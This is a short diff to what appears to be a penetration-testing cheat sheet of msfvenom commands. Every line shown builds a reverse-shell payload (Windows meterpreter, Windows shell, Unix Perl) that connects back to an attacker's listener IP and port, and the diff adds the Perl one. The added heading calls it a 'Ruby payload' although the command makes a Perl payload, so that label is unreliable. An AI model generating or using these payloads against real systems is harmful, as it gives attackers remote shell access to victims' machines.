@@ -17,3 +17,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.5.52 LPORT=4444 -e x06/s
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.93 LPORT=1234 -b "\x00" -f python -v payload
 ```
+Ruby payload:
+```
+msfvenom -p cmd/unix/reverse_perl LHOST=<attacker_IP> LPORT=4000 -f raw
+```
